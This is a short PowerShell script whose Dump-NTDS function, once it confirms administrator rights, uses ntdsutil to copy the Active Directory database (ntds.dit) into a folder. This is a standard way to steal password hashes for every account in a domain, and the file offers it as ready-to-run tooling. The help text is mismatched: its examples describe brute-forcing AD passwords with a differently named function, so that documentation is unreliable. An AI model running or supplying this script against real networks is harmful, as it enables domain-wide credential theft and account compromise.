<#
.Synopsis
    Dumps the active directory dit using ntdsutil
.DESCRIPTION
	Dumps the active directory dit using ntdsutil
.EXAMPLE
    PS C:\> Dump-NTDS -EmptyFolder C:\Temp\NTDS\
    Bruteforce all accounts in AD with the builtinn list of passwords.
.EXAMPLE
	Brute-Ad -list password1,password2,'$password$','$Pa55w0rd$'
	Bruteforce all accounts in AD with a provided list of passwords.
#>
function Dump-NTDS
{
[cmdletbinding()]
Param
(
		[string[]]$EmptyFolder
)

    if( (Get-ChildItem $EmptyFolder | Measure-Object).Count -eq 0)
    {
        if (Test-Administrator) {
            NTdsutil.exe "activate instance ntds" "ifm" "create full $EmptyFolder" "q" "q"
        } else {
            Write-Output "Not running in elevated mode - must run as administrator"
        }
    } else {
        Write-Output "Folder is not empty, must use an empty folder"
    }
    
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}